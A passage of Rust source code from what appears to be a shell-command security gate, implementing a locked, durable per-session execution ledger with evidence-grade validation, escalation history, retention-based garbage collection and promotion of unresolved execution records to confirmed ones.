    let mut reader = lock_file
        .try_clone()
        .map_err(|error| format!("clone execution lock for anchor read: {error}"))?;
    let length = reader
        .metadata()
        .map_err(|error| format!("inspect execution lock anchor: {error}"))?
        .len();
    if length == 0 {
        return Ok(None);
    }
    if length > STRICT_ANCHOR_CAP {
        return Err("execution lock anchor exceeds its size cap".to_string());
    }
    reader
        .seek(SeekFrom::Start(0))
        .map_err(|error| format!("seek execution lock anchor: {error}"))?;
    let mut bytes = Vec::with_capacity(length as usize);
    reader
        .read_to_end(&mut bytes)
        .map_err(|error| format!("read execution lock anchor: {error}"))?;
    let text = std::str::from_utf8(&bytes)
        .map_err(|_| "execution lock anchor is not UTF-8".to_string())?;
    let instance_id = text
        .strip_prefix(STRICT_ANCHOR_PREFIX)
        .and_then(|value| value.strip_suffix('\n'))
        .ok_or_else(|| "execution lock anchor has an invalid frame".to_string())?;
    validate_stable_id("execution ledger instance", instance_id)?;
    Ok(Some(instance_id.to_string()))
}

#[cfg(unix)]
fn bind_strict_anchor(lock_file: &File, lock_path: &Path, instance_id: &str) -> Result<(), String> {
    validate_stable_id("execution ledger instance", instance_id)?;
    match read_strict_anchor(lock_file)? {
        Some(existing) if existing == instance_id => return Ok(()),
        Some(_) => {
            return Err("strict execution state does not match the stable lock anchor".to_string())
        }
        None => {}
    }
    let frame = format!("{STRICT_ANCHOR_PREFIX}{instance_id}\n");
    let mut writer = lock_file
        .try_clone()
        .map_err(|error| format!("clone execution lock for anchor write: {error}"))?;
    writer
        .seek(SeekFrom::Start(0))
        .map_err(|error| format!("seek execution lock anchor for write: {error}"))?;
    writer
        .write_all(frame.as_bytes())
        .map_err(|error| format!("write execution lock anchor: {error}"))?;
    writer
        .set_len(frame.len() as u64)
        .map_err(|error| format!("size execution lock anchor: {error}"))?;
    writer
        .sync_all()
        .map_err(|error| format!("sync execution lock anchor: {error}"))?;
    crate::util::fsync_parent_dir(lock_path)
        .map_err(|error| format!("durably publish execution lock anchor: {error}"))?;
    Ok(())
}

#[cfg(unix)]
fn require_strict_anchor(lock_file: &File, instance_id: &str) -> Result<(), String> {
    match read_strict_anchor(lock_file)? {
        Some(existing) if existing == instance_id => Ok(()),
        Some(_) => Err("strict execution state changed ledger instance".to_string()),
        None => Err("strict execution state lost its stable deletion anchor".to_string()),
    }
}

/// Clear the deletion guard only while GC owns the stable session lock.
#[cfg(unix)]
fn clear_strict_anchor_for_gc(lock_file: &File) -> Result<(), String> {
    let writer = lock_file
        .try_clone()
        .map_err(|error| format!("clone execution lock for GC anchor clear: {error}"))?;
    writer
        .set_len(0)
        .map_err(|error| format!("clear execution lock anchor for GC: {error}"))?;
    writer
        .sync_all()
        .map_err(|error| format!("sync cleared execution lock anchor: {error}"))
}

/// Remove a stale session only after validating the complete strict-state
/// deletion boundary while the caller owns the stable session lock.
///
/// Missing, corrupt, insecure, or anchor-mismatched state is deliberately left
/// untouched. A valid ledger is also retained while any security-bearing record
/// is inside its policy-derived retention window. Legacy imported history has no
/// durable policy window, so it is conservatively retained until a later strict
/// preparation prunes it under a known policy.
#[cfg(unix)]
pub(crate) fn gc_strict_session_locked(
    lock_file: &File,
    lock_path: &Path,
    directory: &Path,
    session_id: &str,
    legacy_json_path: &Path,
) -> Result<bool, String> {
    let lock_identity = secure_regular_identity(lock_file, "execution GC lock")?;
    if path_identity(lock_path, "execution GC lock")? != lock_identity {
        return Err("execution GC lock path changed while locked".to_string());
    }
    let (strict_file, ledger, _, strict_path, strict_identity) =
        open_or_initialize_strict_state(directory, session_id, None, None)?;
    validate_execution_ledger(&ledger, session_id)?;
    require_strict_anchor(lock_file, &ledger.instance_id)?;

    let now = unix_time_ms()?;
    let has_live_legacy_history =
        !ledger.legacy_warning_events.is_empty() || !ledger.legacy_typed_events.is_empty();
    // The record itself is security state even when it carries no derived
    // warning/event payload: its execution/evidence identity is needed for
    // idempotence and unresolved-to-confirmed upgrades.
    let has_live_record_history = ledger
        .confirmed
        .iter()
        .chain(ledger.unresolved.iter())
        .any(|record| record.retention_until_unix_ms >= now);
    if has_live_legacy_history || has_live_record_history {
        return Ok(false);
    }

    let legacy_identity = match fs::symlink_metadata(legacy_json_path) {
        Ok(_) => Some(path_identity(
            legacy_json_path,
            "legacy execution session state for GC",
        )?),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
        Err(error) => {
            return Err(format!(
                "inspect legacy execution session state for GC: {error}"
            ))
        }
    };
    if path_identity(&strict_path, "strict execution state for GC")? != strict_identity
        || path_identity(lock_path, "execution GC lock")? != lock_identity
    {
        return Err("execution GC state changed before deletion".to_string());
    }
    if let Some(expected) = legacy_identity {
        if path_identity(legacy_json_path, "legacy execution session state for GC")? != expected {
            return Err("legacy execution session state changed before GC".to_string());
        }
    }

    clear_strict_anchor_for_gc(lock_file)?;
    let restore_anchor = || bind_strict_anchor(lock_file, lock_path, &ledger.instance_id);
    if legacy_identity.is_some() {
        if let Err(error) = fs::remove_file(legacy_json_path) {
            let restore = restore_anchor();
            return Err(match restore {
                Ok(()) => format!("remove stale legacy execution session state: {error}"),
                Err(restore_error) => format!(
                    "remove stale legacy execution session state: {error}; restore anchor: {restore_error}"
                ),
            });
        }
    }
    drop(strict_file);
    if let Err(error) = fs::remove_file(&strict_path) {
        let restore = restore_anchor();
        return Err(match restore {
            Ok(()) => format!("remove stale strict execution state: {error}"),
            Err(restore_error) => format!(
                "remove stale strict execution state: {error}; restore anchor: {restore_error}"
            ),
        });
    }
    crate::util::fsync_parent_dir(&strict_path)
        .map_err(|error| format!("durably remove stale execution session state: {error}"))?;
    Ok(true)
}

#[cfg(unix)]
fn read_strict_session(
    path: &Path,
    session_id: &str,
) -> Result<
    (
        crate::session_warnings::SessionWarnings,
        Option<FileIdentity>,
        Option<String>,
    ),
    String,
> {
    let mut file = match crate::util::open_read_no_follow_capped(
        path,
        crate::session_warnings::SESSION_FILE_READ_CAP,
    ) {
        Ok(file) => file,
        Err(crate::util::OpenRegularError::NotFound) => {
            return Ok((
                crate::session_warnings::SessionWarnings::new(session_id),
                None,
                None,
            ));
        }
        Err(error) => return Err(format!("strictly open execution session state: {error:?}")),
    };
    let identity = secure_regular_identity(&file, "execution session state")?;
    let mut bytes = Vec::new();
    std::io::Read::by_ref(&mut file)
        .take(crate::session_warnings::SESSION_FILE_READ_CAP.saturating_add(1))
        .read_to_end(&mut bytes)
        .map_err(|error| format!("read execution session state: {error}"))?;
    if bytes.is_empty() {
        return Err("execution session state is empty/corrupt".to_string());
    }
    if bytes.len() as u64 > crate::session_warnings::SESSION_FILE_READ_CAP {
        return Err("execution session state exceeds its strict size cap".to_string());
    }
    let session = serde_json::from_slice(&bytes)
        .map_err(|error| format!("execution session state is corrupt: {error}"))?;
    if path_identity(path, "execution session state")? != identity {
        return Err("execution session state path was replaced while reading it".to_string());
    }
    Ok((session, Some(identity), Some(sha256_hex(&bytes))))
}

#[cfg(unix)]
fn verify_optional_path_identity(
    path: &Path,
    expected: Option<FileIdentity>,
    label: &str,
) -> Result<(), String> {
    match expected {
        Some(identity) if path_identity(path, label)? == identity => Ok(()),
        Some(_) => Err(format!("{label} path was replaced while locked")),
        None => match fs::symlink_metadata(path) {
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
            Ok(_) => Err(format!(
                "{label} appeared after a locked missing-state read"
            )),
            Err(error) => Err(format!("recheck missing {label}: {error}")),
        },
    }
}

pub(crate) fn validate_session_state(
    session: &mut crate::session_warnings::SessionWarnings,
    expected_session_id: &str,
) -> Result<(), String> {
    if session.session_id != expected_session_id {
        return Err("execution session state belongs to a different session".to_string());
    }
    if session.events.len() > crate::session_warnings::MAX_EVENTS
        || session.typed_events.len() > crate::session_warnings::MAX_TYPED_EVENTS
    {
        return Err("legacy execution session security history exceeds its cap".to_string());
    }
    for event in &mut session.events {
        event.domains = event
            .domains
            .iter()
            .map(|domain| domain.to_lowercase())
            .collect();
        event.domains.sort();
        event.domains.dedup();
        validate_warning_event(event)?;
    }
    let mut typed_sequences = std::collections::HashSet::new();
    let mut typed_ids = std::collections::HashSet::new();
    for event in &session.typed_events {
        if event.sequence != 0 && !typed_sequences.insert(event.sequence) {
            return Err("execution session contains duplicate typed-event sequences".to_string());
        }
        if !event.event_id.is_empty() && !typed_ids.insert(event.event_id.clone()) {
            return Err("execution session contains duplicate typed-event ids".to_string());
        }
    }
    crate::session_warnings::migrate_typed_event_identities(session);
    typed_sequences.clear();
    typed_ids.clear();
    let mut max_sequence = 0u64;
    for event in &session.typed_events {
        validate_event_identity(event)?;
        if !typed_sequences.insert(event.sequence) || !typed_ids.insert(event.event_id.clone()) {
            return Err(
                "execution session migration produced duplicate event identity".to_string(),
            );
        }
        max_sequence = max_sequence.max(event.sequence);
    }
    if !session.typed_events.is_empty()
        && (session.next_typed_event_sequence == 0
            || session.next_typed_event_sequence <= max_sequence)
    {
        return Err("execution session has a non-monotonic next event sequence".to_string());
    }
    Ok(())
}

fn validate_execution_ledger(
    ledger: &ExecutionLedger,
    expected_session_id: &str,
) -> Result<(), String> {
    if ledger.schema_version != EXECUTION_LEDGER_SCHEMA_VERSION {
        return Err(format!(
            "unsupported execution ledger schema {}",
            ledger.schema_version
        ));
    }
    if ledger.session_id != expected_session_id {
        return Err("strict execution state belongs to a different session".to_string());
    }
    validate_stable_id("execution ledger instance", &ledger.instance_id)?;
    if ledger.legacy_imported_unix_ms == 0 {
        return Err("strict execution state has an invalid legacy-import timestamp".to_string());
    }
    if ledger.legacy_source_sha256.as_ref().is_some_and(|digest| {
        digest.len() != 64
            || !digest
                .bytes()
                .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
    }) {
        return Err("strict execution state has an invalid legacy-source digest".to_string());
    }
    if ledger.next_sequence == 0 || ledger.next_event_sequence == 0 {
        return Err("strict execution state has a zero next sequence".to_string());
    }
    if ledger.confirmed.len() > MAX_CONFIRMED_EXECUTIONS
        || ledger.unresolved.len() > MAX_UNRESOLVED_EXECUTIONS
        || ledger.legacy_warning_events.len() > crate::session_warnings::MAX_EVENTS
        || ledger.legacy_typed_events.len() > crate::session_warnings::MAX_TYPED_EVENTS
    {
        return Err("strict execution ledger exceeds a security-history cap".to_string());
    }
    let records = ledger.confirmed.iter().chain(ledger.unresolved.iter());
    let warning_count = ledger.legacy_warning_events.len()
        + records
            .clone()
            .map(|record| record.warning_events.len())
            .sum::<usize>();
    let typed_event_count = ledger.legacy_typed_events.len()
        + records
            .clone()
            .map(|record| record.events.len())
            .sum::<usize>();
    let confirmed_escalation_count = ledger
        .confirmed
        .iter()
        .map(|record| record.escalation_events.len())
        .sum::<usize>();
    if warning_count > crate::session_warnings::MAX_EVENTS
        || typed_event_count > crate::session_warnings::MAX_TYPED_EVENTS
        || confirmed_escalation_count > crate::session_warnings::MAX_ESCALATION_EVENTS
    {
        return Err("strict execution ledger exceeds a global live-history cap".to_string());
    }
    for records in [&ledger.confirmed, &ledger.unresolved] {
        for pair in records.as_slices().0.windows(2) {
            if pair[0].ledger_sequence >= pair[1].ledger_sequence
                || pair[0].generation >= pair[1].generation
            {
                return Err("strict execution ledger records are out of order".to_string());
            }
        }
        // VecDeque may wrap into a second physical slice; validate its interior
        // and the logical boundary as well.
        let (first, second) = records.as_slices();
        for pair in second.windows(2) {
            if pair[0].ledger_sequence >= pair[1].ledger_sequence
                || pair[0].generation >= pair[1].generation
            {
                return Err("strict execution ledger records are out of order".to_string());
            }
        }
        if let (Some(left), Some(right)) = (first.last(), second.first()) {
            if left.ledger_sequence >= right.ledger_sequence || left.generation >= right.generation
            {
                return Err("strict execution ledger records are out of order".to_string());
            }
        }
    }

    let mut execution_ids = std::collections::HashSet::new();
    let mut ledger_sequences = std::collections::HashSet::new();
    let mut generations = std::collections::HashSet::new();
    let mut evidence_ids = std::collections::HashSet::new();
    let mut event_ids: std::collections::HashSet<String> = ledger
        .legacy_typed_events
        .iter()
        .map(|event| event.event_id.clone())
        .collect();
    let mut event_sequences: std::collections::HashSet<u64> = ledger
        .legacy_typed_events
        .iter()
        .map(|event| event.sequence)
        .collect();
    if event_ids.len() != ledger.legacy_typed_events.len()
        || event_sequences.len() != ledger.legacy_typed_events.len()
    {
        return Err("legacy strict history contains duplicate event identity".to_string());
    }
    for event in &ledger.legacy_typed_events {
        validate_event_identity(event)?;
        if event.provenance != crate::event_buffer::EventProvenance::Unresolved {
            return Err("legacy strict history lost its unresolved provenance".to_string());
        }
    }
    for event in &ledger.legacy_warning_events {
        validate_warning_event(event)?;
    }
    let mut max_ledger_sequence = 0u64;
    let mut max_generation = 0u64;
    let mut max_event_sequence = ledger
        .legacy_typed_events
        .iter()
        .map(|event| event.sequence)
        .max()
        .unwrap_or(0);
    for (record, should_be_confirmed) in ledger
        .confirmed
        .iter()
        .map(|record| (record, true))
        .chain(ledger.unresolved.iter().map(|record| (record, false)))
    {
        validate_ledger_record(record, ledger.generation)?;
        if record.is_confirmed() != should_be_confirmed {
            return Err("execution record is stored in the wrong evidence ledger".to_string());
        }
        if !execution_ids.insert(record.execution_id.clone()) {
            return Err(
                "strict execution ledger contains a duplicate execution identity".to_string(),
            );
        }
        for transition in &record.evidence_history {
            if !ledger_sequences.insert(transition.ledger_sequence)
                || !generations.insert(transition.generation)
                || !evidence_ids.insert(transition.evidence_id.clone())
            {
                return Err(
                    "strict execution ledger contains duplicate transition identity".to_string(),
                );
            }
            max_ledger_sequence = max_ledger_sequence.max(transition.ledger_sequence);
            max_generation = max_generation.max(transition.generation);
        }
        for event in &record.events {
            if !event_ids.insert(event.event_id.clone()) || !event_sequences.insert(event.sequence)
            {
                return Err("strict execution ledger reuses a live event identity".to_string());
            }
            max_event_sequence = max_event_sequence.max(event.sequence);
        }
    }
    if max_generation > ledger.generation
        || (!ledger_sequences.is_empty() && ledger.next_sequence <= max_ledger_sequence)
        || (!event_sequences.is_empty() && ledger.next_event_sequence <= max_event_sequence)
    {
        return Err("strict execution ledger has non-monotonic counters".to_string());
    }
    Ok(())
}

fn validate_event_identity(event: &crate::event_buffer::TypedEvent) -> Result<(), String> {
    validate_stable_id("event", &event.event_id)?;
    if event.sequence == 0 {
        return Err("typed event has a zero sequence".to_string());
    }
    chrono::DateTime::parse_from_rfc3339(&event.timestamp)
        .map_err(|_| "typed event has an invalid timestamp".to_string())?;
    if event.timestamp.len() > 64
        || event.rule_id.is_empty()
        || event.rule_id.len() > 128
        || event.metadata.len() > 32
        || event
            .metadata
            .iter()
            .any(|(key, value)| key.is_empty() || key.len() > 64 || value.len() > 512)
    {
        return Err("typed event exceeds its semantic bounds".to_string());
    }
    Ok(())
}

fn validate_warning_event(event: &crate::session_warnings::WarningEvent) -> Result<(), String> {
    chrono::DateTime::parse_from_rfc3339(&event.timestamp)
        .map_err(|_| "strict warning event has an invalid timestamp".to_string())?;
    if event.rule_id.is_empty()
        || event.rule_id.len() > 128
        || event.severity.len() > 32
        || event.title.len() > 120
        || event.command_redacted.len() > 120
        || event.domains.len() > 32
        || event.domains.iter().any(|domain| domain.len() > 255)
        || event.domains.windows(2).any(|pair| pair[0] >= pair[1])
        || event
            .domains
            .iter()
            .any(|domain| domain != &domain.to_lowercase())
    {
        return Err("strict warning event exceeds its semantic bounds".to_string());
    }
    Ok(())
}

fn validate_escalation_event(
    event: &crate::session_warnings::EscalationEvent,
) -> Result<(), String> {
    chrono::DateTime::parse_from_rfc3339(&event.timestamp)
        .map_err(|_| "strict escalation event has an invalid timestamp".to_string())?;
    if event.rule_id.is_empty()
        || event.rule_id.len() > 128
        || event
            .domain
            .as_ref()
            .is_some_and(|domain| domain.len() > 255)
    {
        return Err("strict escalation event exceeds its semantic bounds".to_string());
    }
    Ok(())
}

fn validate_ledger_record(
    record: &ExecutionLedgerRecord,
    current_generation: u64,
) -> Result<(), String> {
    validate_stable_id("execution", &record.execution_id)?;
    validate_stable_id("evidence", &record.evidence_id)?;
    if record.evidence_history.is_empty() || record.evidence_history.len() > 4 {
        return Err("execution record has an invalid evidence-transition history".to_string());
    }
    let mut prior_observed = 0u64;
    let mut prior_sequence = 0u64;
    let mut prior_generation = 0u64;
    for transition in &record.evidence_history {
        validate_stable_id("evidence transition", &transition.evidence_id)?;
        if transition.observed_unix_ms < prior_observed
            || transition.ledger_sequence <= prior_sequence
            || transition.generation <= prior_generation
            || transition.generation > current_generation
        {
            return Err("execution evidence transitions are out of order".to_string());
        }
        prior_observed = transition.observed_unix_ms;
        prior_sequence = transition.ledger_sequence;
        prior_generation = transition.generation;
    }
    let first_transition = record
        .evidence_history
        .first()
        .expect("non-empty evidence history checked above");
    let last_transition = record
        .evidence_history
        .last()
        .expect("non-empty evidence history checked above");
    if first_transition.observed_unix_ms != record.committed_unix_ms
        || last_transition.evidence_id != record.evidence_id
        || last_transition.grade != record.evidence_grade
        || last_transition.ledger_sequence != record.ledger_sequence
        || last_transition.generation != record.generation
    {
        return Err(
            "execution record current evidence disagrees with its transition history".to_string(),
        );
    }
    if record.evidence_grade.is_confirmed() {
        if record
            .evidence_history
            .iter()
            .take(record.evidence_history.len().saturating_sub(1))
            .any(|transition| transition.grade.is_confirmed())
        {
            return Err(
                "confirmed execution has an invalid repeated evidence transition".to_string(),
            );
        }
    } else if record
        .evidence_history
        .iter()
        .any(|transition| transition.grade.is_confirmed())
    {
        return Err("unresolved execution contains confirmed evidence history".to_string());
    }
    let grades: Vec<ExecutionEvidenceGrade> = record
        .evidence_history
        .iter()
        .map(|transition| transition.grade)
        .collect();
    if !matches!(
        grades.as_slice(),
        [ExecutionEvidenceGrade::KernelExecStop]
            | [ExecutionEvidenceGrade::GatewayCompleted]
            | [ExecutionEvidenceGrade::KernelExecStoppedUnresolved]
            | [ExecutionEvidenceGrade::ShellBoundaryUnresolved]
            | [ExecutionEvidenceGrade::GatewayForwardedUnresolved]
            | [
                ExecutionEvidenceGrade::ShellBoundaryUnresolved,
                ExecutionEvidenceGrade::KernelExecStop
            ]
            | [
                ExecutionEvidenceGrade::GatewayForwardedUnresolved,
                ExecutionEvidenceGrade::GatewayCompleted
            ]
            | [
                ExecutionEvidenceGrade::KernelExecStoppedUnresolved,
                ExecutionEvidenceGrade::KernelExecStop
            ]
    ) {
        return Err("execution record contains an illegal evidence-grade transition".to_string());
    }
    for (label, digest) in [
        ("draft identity", record.draft_identity_sha256.as_str()),
        ("command", record.command_sha256.as_str()),
        ("policy", record.policy_basis_sha256.as_str()),
        ("verdict", record.verdict_basis_sha256.as_str()),
    ] {
        if digest.len() != 64
            || !digest
                .bytes()
                .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
        {
            return Err(format!("execution record has an invalid {label} digest"));
        }
    }
    if record.command_redacted_preview.len() > 120 {
        return Err("execution record preview exceeds its cap".to_string());
    }
    if record.retention_until_unix_ms < record.committed_unix_ms {
        return Err("execution record retention precedes its commit".to_string());
    }
    if record.ledger_sequence == 0 || record.generation == 0 {
        return Err("execution record has a zero durable sequence/generation".to_string());
    }
    if record.generation > current_generation {
        return Err("execution record generation is from the future".to_string());
    }
    if record.events.len() > 16 {
        return Err("execution record contains too many typed events".to_string());
    }
    if record.warning_events.len() > MAX_WARNING_EVENTS_PER_EXECUTION
        || record.escalation_events.len() > MAX_ESCALATION_EVENTS_PER_EXECUTION
    {
        return Err("execution record contains too much strict history".to_string());
    }
    for event in &record.warning_events {
        validate_warning_event(event)?;
    }
    for event in &record.escalation_events {
        validate_escalation_event(event)?;
    }
    let mut ids = std::collections::HashSet::new();
    let mut sequences = std::collections::HashSet::new();
    for event in &record.events {
        validate_event_identity(event)?;
        let expected_provenance = if record.evidence_grade.is_confirmed() {
            crate::event_buffer::EventProvenance::Confirmed
        } else {
            crate::event_buffer::EventProvenance::Unresolved
        };
        if event.provenance != expected_provenance {
            return Err("execution event provenance disagrees with its evidence grade".to_string());
        }
        if !ids.insert(event.event_id.clone()) || !sequences.insert(event.sequence) {
            return Err("execution record contains invalid event identity".to_string());
        }
    }
    Ok(())
}

fn strict_history_session(ledger: &ExecutionLedger) -> crate::session_warnings::SessionWarnings {
    let mut history = crate::session_warnings::SessionWarnings::new(&ledger.session_id);
    history.events = ledger.legacy_warning_events.clone();
    for record in ledger.confirmed.iter().chain(ledger.unresolved.iter()) {
        history.events.extend(record.warning_events.iter().cloned());
    }
    // Cooldowns can relax a later escalation, so only a confirmed strict
    // transition may contribute them. Legacy and unresolved markers are never
    // allowed to suppress enforcement.
    for record in &ledger.confirmed {
        history
            .escalation_events
            .extend(record.escalation_events.iter().cloned());
    }
    history.total_warnings = u32::try_from(history.events.len()).unwrap_or(u32::MAX);
    history
}

fn evaluate_against_session(
    raw_verdict: &Verdict,
    policy: &Policy,
    command: &str,
    caller: CallerContext,
    shell: ShellType,
    ledger: &ExecutionLedger,
) -> Result<
    (
        Verdict,
        Vec<EventPrototype>,
        Vec<crate::escalation::EscalationHit>,
    ),
    String,
> {
    let mut effective =
        crate::escalation::apply_stateless_policy_effects(raw_verdict, policy, caller);
    let mut escalation_hits = Vec::new();
    if !policy.escalation.is_empty() && matches!(effective.action, Action::Warn | Action::WarnAck) {
        let strict_history = strict_history_session(ledger);
        let (action, _causal, hits, reason) = crate::escalation::apply_escalation(
            effective.action,
            &effective.findings,
            &strict_history,
            &policy.escalation,
        );
        if action != effective.action {
            effective.escalation_reason = reason;
            escalation_hits = hits;
        }
        effective.action = action;
    }

    let prototypes =
        crate::escalation::derive_event_prototypes_for_shell(command, &effective, shell);
    let now = chrono::Utc::now().to_rfc3339();
    let mut events: Vec<crate::event_buffer::TypedEvent> =
        ledger.legacy_typed_events.iter().cloned().collect();
    for record in &ledger.confirmed {
        events.extend(record.events.iter().cloned());
    }
    // A deferred observation must tighten later, unrelated decisions. When the
    // exact same draft is upgraded, its provisional events are added below, so
    // retaining its unresolved copy here would double-count one execution.
    for record in &ledger.unresolved {
        events.extend(record.events.iter().cloned());
    }
    let mut used: std::collections::HashSet<u64> =
        events.iter().map(|event| event.sequence).collect();
    let start = events
        .iter()
        .map(|event| event.sequence)
        .max()
        .unwrap_or(0)
        .checked_add(1)
        .ok_or_else(|| "provisional typed-event sequence space is exhausted".to_string())?;
    let mut sequence = next_free_sequence(&used, start)
        .ok_or_else(|| "provisional typed-event sequence space is exhausted".to_string())?;
    for (index, prototype) in prototypes.iter().cloned().enumerate() {
        events.push(prototype.materialize(
            format!("provisional-{}-{index}", uuid::Uuid::new_v4().simple()),
            sequence,
            now.clone(),
            crate::event_buffer::EventProvenance::Provisional,
        ));
        used.insert(sequence);
        let next = sequence
            .checked_add(1)
            .ok_or_else(|| "provisional typed-event sequence space is exhausted".to_string())?;
        sequence = next_free_sequence(&used, next)
            .ok_or_else(|| "provisional typed-event sequence space is exhausted".to_string())?;
    }
    let hits = crate::event_buffer::correlate(&events, &now);
    crate::escalation::apply_correlation_findings(&mut effective, policy, &hits);
    Ok((effective, prototypes, escalation_hits))
}

fn recheck_under_lock(ledger: &ExecutionLedger, draft: &ExecutionDraft) -> Result<(), String> {
    validate_draft(draft)?;
    let mut history = ledger.clone();
    history
        .unresolved
        .retain(|record| record.execution_id != draft.execution_id());
    let (rechecked, prototypes, escalation_hits) = evaluate_against_session(
        draft.raw_verdict(),
        draft.correlation_policy(),
        draft.command(),
        draft.caller(),
        draft.shell(),
        &history,
    )?;
    if prototypes != draft.provisional_events {
        return Err("execution gate recheck changed the derived event identity".to_string());
    }
    if escalation_hits != draft.escalation_hits {
        return Err("execution gate recheck changed the strict escalation identity".to_string());
    }
    let rechecked_basis =
        PreparedDecision::from_frozen_basis(&rechecked, draft.correlation_policy())?;
    if rechecked_basis != draft.decision {
        return Err("execution gate recheck changed the frozen policy decision".to_string());
    }
    if BypassSnapshot::from_verdict(&rechecked)? != draft.bypass {
        return Err("execution gate recheck changed the frozen bypass basis".to_string());
    }
    if rechecked.action == Action::Block && !draft.bypass.honored() {
        return Err("execution gate recheck produced a blocking correlation".to_string());
    }
    Ok(())
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ShellReceiptRecovery {
    Missing,
    Committed { generation: u64 },
}

#[allow(clippy::too_many_arguments)]
fn recover_shell_receipt_transition(
    session_id: &str,
    execution_id: &str,
    draft_identity_sha256: &str,
    command_sha256: &str,
    policy_basis_sha256: &str,
    verdict_basis_sha256: &str,
    evidence_id: &str,
    timeout: Duration,
) -> Result<ShellReceiptRecovery, String> {
    #[cfg(not(unix))]
    {
        let _ = (
            session_id,
            execution_id,
            draft_identity_sha256,
            command_sha256,
            policy_basis_sha256,
            verdict_basis_sha256,
            evidence_id,
            timeout,
        );
        return Err("strict shell-receipt recovery is unsupported on this platform".to_string());
    }

    #[cfg(unix)]
    {
        let deadline = Instant::now()
            .checked_add(timeout)
            .ok_or_else(|| "shell-receipt recovery deadline overflowed".to_string())?;
        let state_path = crate::session_warnings::session_state_path(session_id)
            .ok_or_else(|| "shell receipt has an invalid session id".to_string())?;
        let lock_path = crate::session_warnings::session_lock_path(session_id)
            .ok_or_else(|| "shell receipt has no stable session lock".to_string())?;
        let parent = state_path
            .parent()
            .ok_or_else(|| "shell receipt session path has no parent".to_string())?;
        ensure_secure_session_directory(parent)?;
        let lock_file =
            open_and_lock_secure(&lock_path, deadline).map_err(|error| error.to_string())?;
        let (_, ledger, _, _, _) = open_or_initialize_strict_state(parent, session_id, None, None)?;
        validate_execution_ledger(&ledger, session_id)?;
        require_strict_anchor(&lock_file, &ledger.instance_id)?;
        let recovery = match ledger
            .confirmed
            .iter()
            .chain(ledger.unresolved.iter())
            .find(|record| record.execution_id == execution_id)
        {
            None => ShellReceiptRecovery::Missing,
            Some(record)
                if record.draft_identity_sha256 == draft_identity_sha256
                    && record.command_sha256 == command_sha256
                    && record.policy_basis_sha256 == policy_basis_sha256
                    && record.verdict_basis_sha256 == verdict_basis_sha256
                    && record.evidence_id == evidence_id
                    && record.evidence_grade == ExecutionEvidenceGrade::ShellBoundaryUnresolved =>
            {
                ShellReceiptRecovery::Committed {
                    generation: record.generation,
                }
            }
            Some(_) => {
                return Err(
                    "shell receipt execution id is already bound to different durable evidence"
                        .to_string(),
                )
            }
        };
        fs2::FileExt::unlock(&lock_file)
            .map_err(|error| format!("unlock shell-receipt recovery session: {error}"))?;
        Ok(recovery)
    }
}

fn promote_record(
    ledger: &mut ExecutionLedger,
    draft: &ExecutionDraft,
    evidence: &ExecutionEvidence,
) -> Result<PromotionOutcome, String> {
    validate_execution_ledger(ledger, draft.session_id())?;
    prune_expired_security_history(ledger, draft)?;

    if let Some(existing) = ledger
        .confirmed
        .iter()
        .find(|record| record.execution_id == draft.execution_id)
    {
        if !existing.identity_matches(draft) || !existing.exact_evidence_matches(evidence) {
            return Err("execution id replay changed its identity or evidence".to_string());
        }
        return Ok(PromotionOutcome::Idempotent {
            generation: existing.generation,
        });
    }

    let unresolved_index = ledger
        .unresolved
        .iter()
        .position(|record| record.execution_id == draft.execution_id);
    if let Some(index) = unresolved_index {
        let existing = &ledger.unresolved[index];
        if !existing.identity_matches(draft) {
            return Err("execution id replay changed its immutable identity".to_string());
        }
        if !evidence.grade().is_confirmed() {
            if existing.exact_evidence_matches(evidence) {
                return Ok(PromotionOutcome::Idempotent {
                    generation: existing.generation,
                });
            }
            return Err("unresolved execution replay changed its evidence".to_string());
        }
        let compatible_upgrade = matches!(
            (existing.evidence_grade, evidence.grade()),
            (
                ExecutionEvidenceGrade::GatewayForwardedUnresolved,
                ExecutionEvidenceGrade::GatewayCompleted
            ) | (
                ExecutionEvidenceGrade::ShellBoundaryUnresolved,
                ExecutionEvidenceGrade::KernelExecStop
            ) | (
                ExecutionEvidenceGrade::KernelExecStoppedUnresolved,
                ExecutionEvidenceGrade::KernelExecStop
            )
        );
        if !compatible_upgrade {
            return Err("unresolved execution cannot cross evidence channels".to_string());
        }

        let confirmed_escalations = ledger
            .confirmed
            .iter()
            .map(|record| record.escalation_events.len())
            .sum::<usize>();
        if confirmed_escalations.saturating_add(existing.escalation_events.len())
            > crate::session_warnings::MAX_ESCALATION_EVENTS
        {
            return Err("strict confirmed escalation-marker capacity is exhausted".to_string());
        }

        ensure_record_capacity(
            &mut ledger.confirmed,
            MAX_CONFIRMED_EXECUTIONS,
            RecordCompaction::CleanGatewayCompletions,
        )?;
        let previous = ledger
            .unresolved
            .remove(index)
            .ok_or_else(|| "unresolved execution disappeared during promotion".to_string())?;
        let (generation, ledger_sequence) = advance_ledger(ledger)?;
        let mut events = previous.events;
        for event in &mut events {
            event.provenance = crate::event_buffer::EventProvenance::Confirmed;
        }
        let transition_time = unix_time_ms()?;
        let mut evidence_history = previous.evidence_history;
        evidence_history.push(EvidenceTransition {
            evidence_id: evidence.evidence_id.clone(),
            grade: evidence.grade(),
            observed_unix_ms: transition_time,
            ledger_sequence,
            generation,
        });
        let record = ExecutionLedgerRecord {
            execution_id: previous.execution_id,
            draft_identity_sha256: previous.draft_identity_sha256,
            command_sha256: previous.command_sha256,
            command_redacted_preview: previous.command_redacted_preview,
            policy_basis_sha256: previous.policy_basis_sha256,
            verdict_basis_sha256: previous.verdict_basis_sha256,
            evidence_id: evidence.evidence_id.clone(),
            evidence_grade: evidence.grade(),
            evidence_history,
            committed_unix_ms: previous.committed_unix_ms,
            retention_until_unix_ms: previous
                .retention_until_unix_ms
                .max(draft.retention_until_unix_ms),
            ledger_sequence,
            generation,
            warning_events: previous.warning_events,
            escalation_events: previous.escalation_events,
            events,
        };
        ledger.confirmed.push_back(record);
        validate_execution_ledger(ledger, draft.session_id())?;
        return Ok(PromotionOutcome::Upgraded { generation });
    }

    if evidence.grade().is_confirmed() {
        ensure_record_capacity(
            &mut ledger.confirmed,
            MAX_CONFIRMED_EXECUTIONS,
            RecordCompaction::CleanGatewayCompletions,
        )?;
    } else {
